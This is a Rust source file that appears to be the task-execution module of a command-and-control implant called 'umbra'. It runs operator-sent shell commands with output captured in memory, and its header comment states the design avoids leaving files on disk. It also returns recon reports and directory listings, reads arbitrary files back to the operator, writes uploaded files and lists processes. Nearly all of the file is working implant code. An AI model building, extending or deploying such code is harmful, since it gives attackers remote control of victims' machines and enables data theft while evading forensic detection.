//! Task execution.
//!
//! All command execution is memory-only from the implant's point of view: the
//! command is handed to the platform shell through a pipe, its output is read
//! back into the process, and nothing is staged on disk (no temp scripts, no
//! dropped binaries). File transfer tasks only touch paths the operator names.

use std::io::Read;
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

use crate::sysinfo;
use crate::upk::{self, Value};

pub const MAX_OUTPUT: usize = 900 * 1024; // stay below the 1 MiB frame limit

pub struct Outcome {
    pub code: i64,
    pub out: Vec<u8>,
    pub err: String,
}

impl Outcome {
    pub fn ok(out: Vec<u8>) -> Self {
        Outcome { code: 0, out, err: String::new() }
    }
    pub fn err(code: i64, msg: impl Into<String>) -> Self {
        Outcome { code, out: Vec::new(), err: msg.into() }
    }
    pub fn to_value(&self, task_id: &str) -> Value {
        upk::map(vec![
            ("id", upk::s(task_id)),
            ("code", upk::i(self.code)),
            ("out", upk::bin(&self.out)),
            ("err", upk::s(&self.err)),
        ])
    }
}

fn shell_command(cmd: &str) -> Command {
    #[cfg(windows)]
    {
        let mut c = Command::new("cmd.exe");
        c.arg("/C").arg(cmd);
        c
    }
    #[cfg(not(windows))]
    {
        let mut c = Command::new("/bin/sh");
        c.arg("-c").arg(cmd);
        c
    }
}

fn truncate(mut v: Vec<u8>) -> Vec<u8> {
    if v.len() > MAX_OUTPUT {
        v.truncate(MAX_OUTPUT);
        v.extend_from_slice(b"\n[umbra: output truncated]\n");
    }
    v
}

/// Run a shell command with a hard timeout, capturing stdout+stderr.
pub fn shell(cmd: &str, timeout_secs: u64) -> Outcome {
    if cmd.trim().is_empty() {
        return Outcome::err(1, "empty command");
    }
    let mut child = match shell_command(cmd)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => return Outcome::err(127, format!("spawn failed: {e}")),
    };

    let deadline = Instant::now() + Duration::from_secs(timeout_secs.max(1));
    loop {
        match child.try_wait() {
            Ok(Some(_)) => break,
            Ok(None) => {
                if Instant::now() > deadline {
                    let _ = child.kill();
                    let _ = child.wait();
                    return Outcome::err(124, format!("command timed out after {timeout_secs}s"));
                }
                std::thread::sleep(Duration::from_millis(20));
            }
            Err(e) => return Outcome::err(1, format!("wait failed: {e}")),
        }
    }

    let mut out = Vec::new();
    if let Some(mut stdout) = child.stdout.take() {
        let _ = stdout.read_to_end(&mut out);
    }
    if let Some(mut stderr) = child.stderr.take() {
        let _ = stderr.read_to_end(&mut out);
    }
    let code = child
        .wait()
        .ok()
        .and_then(|s| s.code())
        .map(|c| c as i64)
        .unwrap_or(0);
    Outcome { code, out: truncate(out), err: String::new() }
}

/// Execute one task. `sleep`/`exit` are handled by the beacon loop itself, so
/// they are only reported here for completeness.
pub fn run(kind: &str, args: &Value) -> Outcome {
    match kind {
        "shell" | "exec" => {
            let cmd = args.str_or("cmd", "");
            let timeout = args.u64_or("timeout", 120);
            shell(&cmd, timeout)
        }
        "sysinfo" | "recon" => Outcome::ok(sysinfo::report().into_bytes()),
        "pwd" | "cwd" => match std::env::current_dir() {
            Ok(p) => Outcome::ok(format!("{}\n", p.display()).into_bytes()),
            Err(e) => Outcome::err(1, format!("cwd: {e}")),
        },
        "ls" => {
            let path = args.str_or("path", ".");
            let mut out = String::new();
            match std::fs::read_dir(&path) {
                Ok(entries) => {
                    for entry in entries.flatten() {
                        let meta = entry.metadata().ok();
                        let kind = match meta {
                            Some(m) if m.is_dir() => "d",
                            _ => "-",
                        };
                        let size = meta.map(|m| m.len()).unwrap_or(0);
                        out.push_str(&format!(
                            "{kind} {:>12} {}\n",
                            size,
                            entry.path().display()
                        ));
                    }
                    Outcome::ok(out.into_bytes())
                }
                Err(e) => Outcome::err(1, format!("ls {path}: {e}")),
            }
        }
        "download" | "cat" => {
            let path = args.str_or("path", "");
            if path.is_empty() {
                return Outcome::err(1, "download requires args.path");
            }
            match std::fs::read(&path) {
                Ok(data) => Outcome::ok(truncate(data)),
                Err(e) => Outcome::err(1, format!("download {path}: {e}")),
            }
        }
        "upload" => {
            let path = args.str_or("path", "");
            let data = args.bin_or("data", b"");
            if path.is_empty() {
                return Outcome::err(1, "upload requires args.path");
            }
            match std::fs::write(&path, &data) {
                Ok(()) => Outcome::ok(format!("wrote {} bytes to {path}\n", data.len()).into_bytes()),
                Err(e) => Outcome::err(1, format!("upload {path}: {e}")),
            }
        }
        "ps" => {
            // Portable enough for a PoC: ask the platform for the process list.
            #[cfg(windows)]
            let cmd = "tasklist";
            #[cfg(target_os = "linux")]
            let cmd = "ps -eo pid,ppid,user,comm --sort=pid";
            #[cfg(target_os = "macos")]
            let cmd = "ps -eo pid,ppid,user,comm";
            #[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
            let cmd = "ps";
            shell(cmd, 30)
        }
        "sleep" => Outcome::ok(b"sleep interval updated\n".to_vec()),
        "exit" | "kill" => Outcome::ok(b"beacon exiting\n".to_vec()),
        "ping" => Outcome::ok(b"pong\n".to_vec()),
        other => Outcome::err(2, format!("unknown task kind {other:?}")),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shell_captures_output() {
        let outcome = shell("echo umbra", 10);
        assert_eq!(outcome.code, 0);
        assert!(String::from_utf8_lossy(&outcome.out).contains("umbra"));
    }

    #[test]
    fn unknown_kind_is_reported() {
        let outcome = run("nope", &upk::map(vec![]));
        assert_eq!(outcome.code, 2);
        assert!(outcome.err.contains("unknown task kind"));
    }
}
